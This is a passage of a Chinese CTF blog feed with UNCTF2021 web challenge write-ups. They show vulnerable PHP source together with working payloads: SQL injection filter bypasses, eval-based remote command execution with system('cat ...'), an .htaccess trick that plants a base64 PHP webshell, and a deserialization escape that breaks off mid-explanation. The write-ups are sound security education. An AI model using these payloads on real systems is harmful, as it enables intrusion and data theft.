<code>$_GET</code> 传入所需执行的函数，由于 <code>end</code> 和 <code>next</code> 不能使用，可使用 <code>reset</code> 和 <code>array_reverse</code> 调整数组与取值，再利用 <code>eval</code> 命令执行。</p><p>payload：<code>?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2021-公开赛</title>
    <link href="https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2021-12-07T11:44:54.000Z</published>
    <updated>2021-12-07T16:08:16.383Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>为响应国家选拔、推荐优秀网络空间安全专业人才，培养学生的创新意识与团队合作精神，提高大学生的网络安全技术水平、创新实践与综合设计能力，推动我国高校网络空间安全专业建设与改革，全国9所高校（闽南师范大学，福州大学至诚学院，重庆大学，陆军工程大学，南京航空航天大学，金陵科技学院，西华大学，浙江师范大学，厦门理工大学）决定组成联合招新赛，秉着公平，公正，公开的原则为本高校选拔网络空间安全专业人才。</p><p>竞赛时间</p><p>2021年11月28日-2021年12月6日</p><p>竞赛平台</p><p>自研平台，平台地址：<a href="https://ctf.unctf.com/">https://ctf.unctf.com/</a></p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="fuzz-md5"><a href="#fuzz-md5" class="headerlink" title="fuzz_md5"></a>fuzz_md5</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"><span class="variable">$pass2</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass3</span>=substr(<span class="variable">$pass2</span>, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable">$a</span>=preg_replace(<span class="string">&quot;/unctf/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&quot;unctf&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass3</span>===<span class="string">&quot;66666&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><code>user</code> 参数值双写绕过，<code>pass</code> 参数值爆破符合前5位是66666的MD5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    x = md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> x.startswith(<span class="string">&#x27;66666&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1004649</span></span><br></pre></td></tr></table></figure><p>Payload：<code>http://xxx/?user=ununctfctf</code>，POST传参 <code>pass=1004649</code>。</p><p>flag：<code>UNCTF&#123;13875534-9edb-4e2b-b51c-b18091ca1284&#125;</code></p><p>​    </p><h3 id="can-you-hacked-me"><a href="#can-you-hacked-me" class="headerlink" title="can_you_hacked_me"></a>can_you_hacked_me</h3><blockquote><p>带黑阔，你能把我骇咯？</p></blockquote><p><code>www.zip</code> 得到源码。</p><p><code>index.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can You Hacked me?&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Can You Hacked me?&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/&#x27;|union|select|&amp;|\||and|or|\(|,/i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/\&#x27;|union|select|&amp;|\\||and|or|(|,/i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    $username = $_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = $_GET[&#x27;password&#x27;];</span><br><span class="line">    </span><br><span class="line">    waf1($username) || waf1($password);</span><br><span class="line">    </span><br><span class="line">    if (strtolower($_GET[&#x27;username&#x27;]) == &#x27;admin&#x27; &amp;&amp; $_SERVER[&quot;REMOTE_ADDR&quot;] != &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">        die(&#x27;Admin only allow to login at localhost&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $conn = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;select * from `users` where username = &#x27;$username&#x27; and password = &#x27;$password&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    </span><br><span class="line">    echo $sql . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    </span><br><span class="line">    if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">        // 输出数据</span><br><span class="line">        while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">            if($row[&quot;username&quot;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">                echo &#x27;Welcome Admin, here is your flag: &#x27; . $flag;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;You are not Admin.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Result Not Found!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>db.sql</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> supersqli;</span><br><span class="line"></span><br><span class="line">USE supersqli;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `users` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM  <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;AdminSecret&#x27;</span>);</span><br></pre></td></tr></table></figure><p>禁用的关键字使得难以进行常规注入，考虑让where条件恒真，<code>username</code> 传入 <code>\</code> 转义后单引号，使 <code>username</code> 的值为 <code>&#39; and password =</code>，<code>password</code> 传入异或操作，使总条件恒真，再筛选出第二条数据即可让查询结果为 <code>admin</code>。</p><p>Payload：</p><p><code>http://xxx/?username=\&amp;password=^0 limit 2 offset 1 --+</code></p><p>flag：<code>UNCTF&#123;3abc4508-17c4-488e-9b2b-3fa11fee771c&#125;</code></p><p>​    </p><h3 id="phpmysql"><a href="#phpmysql" class="headerlink" title="phpmysql"></a>phpmysql</h3><blockquote><p>你了解flag吗?在根目录哦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;欢迎来到unctf2021，have fun&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_host</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$db_user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$db_pwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$db_port</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db_host</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库地址不能为空！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$db_host</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;fakeflag is /flag&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_user</span>) || preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_pwd</span>) || preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_port</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;嘉然今天吃什么&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;mysql -h <span class="subst">$db_host</span> -u <span class="subst">$db_user</span> -p <span class="subst">$db_pwd</span> -P <span class="subst">$db_port</span> --enable-local-infile&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;Maybe you can do someting else&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$db_user</span>) || !<span class="keyword">isset</span>(<span class="variable">$db_pwd</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new Exception(\&quot;&lt;script&gt;alert(&#x27;关注嘉然，顿顿解馋！！！&#x27;);&lt;/script&gt;\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$db_user</span> = str_ireplace(<span class="string">&quot;SplFileObject&quot;</span>, <span class="string">&quot;UNCTF2021&quot;</span>, <span class="variable">$db_user</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$db_user</span>(<span class="subst">$db_pwd</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></blockquote><p>利用最后 <code>eval(&quot;echo new $db_user($db_pwd);&quot;);</code> 的拼接特性，用类 <code>DirectoryIterator</code> 列目录后，再RCE。</p><p>Payload：</p><p>POST传参 <code>host=x&amp;pwd=y&amp;port=z&amp;user=DirectoryIterator(&quot;glob:///*&quot;);system(&quot;cat /fllllaaaaag&quot;);//</code></p><p>​    </p><h3 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">&quot;/ph|\.\.|\//i&quot;</span>, <span class="variable">$filename</span>) || strlen(<span class="variable">$filename</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">&quot;/&lt;\?|ph/&quot;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$sandbox</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    @file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>传入文件名和内容写文件，禁用的关键字禁掉了伪协议、目录穿越、常规PHP头和写PHP文件。</p><p>由于sandbox内无现成PHP文件，考虑写 <code>.htaccess</code> 文件将普通文件以PHP文件解析。</p><p>文件内无法写入PHP代码，可以先写入base64编码字符串后，再利用 <code>.htaccess</code> 文件伪协议解析即可， <code>.htaccess</code> 文件中的用到的 <code>php</code> 关键字用 <code>\</code> 换行绕过。</p><p> <code>.htaccess</code> 文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br><span class="line">p\</span><br><span class="line">hp_value auto_append_file &quot;p\</span><br><span class="line">hp://filter/convert.base64-decode/resource=1.jpg&quot;</span><br></pre></td></tr></table></figure><p>Payload：</p><p><code>http://xxx/?filename=.htaccess&amp;content=AddType%20application/x-httpd-p\%0ahp%20.jpg%0ap\%0ahp_value%20auto_append_file%20&quot;p\%0ahp://filter/convert.base64-decode/resource=1.jpg&quot;</code></p><p><code>http://xxx/?filename=1.jpg&amp;content=PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs%2FPg%3D%3D</code></p><p>最后访问 <code>1.jpg</code> 得到flag。</p><p>​    </p><h3 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="variable">$action</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        highlight_file(<span class="string">&#x27;function.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>) &amp;&amp; <span class="variable">$a</span> !=<span class="variable">$b</span>)&#123;</span><br><span class="line">    unserialize(filter(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>POST传入 <code>action=1</code>，得到 <code>function.php</code> 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">me7eorite</span></span>&#123;</span><br><span class="line">    <span class="comment">//test  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$safe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;safe = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> UNCTF(<span class="string">&#x27;me7eorite&#x27;</span>,<span class="string">&#x27;me7eorite@qq.com&#x27;</span>,<span class="string">&#x27;me7eorite&#x27;</span>);           </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getShell();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;safe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UNCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass  = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;this_is_fake&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&#x27;Welcome to UNCTF 2021!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层，PHP弱比较特性，数组绕过，传入 <code>?a[]=1&amp;b[]=2</code>；</p><p>第二层，PHP序列化+反序列化，<code>filter()</code> 删除三种关键字，明显的减字符型反序列化逃逸。</p><p>本地测试，先正常POST传值 <code>name=z&amp;pass=x&amp;email=y</code>，得到序列化字符串：</p><p><code>O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:3:&quot;x&quot;;s:5:&quot;email&quot;;s:3:&quot;y&quot;;s:4:&quot;name&quot;;s:3:&quot;z&quot;;&#125;</code>。</p><p>观察利用链：类<code>UNCTF</code> 的 <code>__destruct()</code> 中，控制 <code>$this-&gt;name</code> 可以触发类 <code>me7eorite</code> 的 <code>__toString()</code>，控制 <code>$this-&gt;class</code> 为新的 <code>me7eorite</code> 对象，避免调用类 <code>UNCTF</code> 的 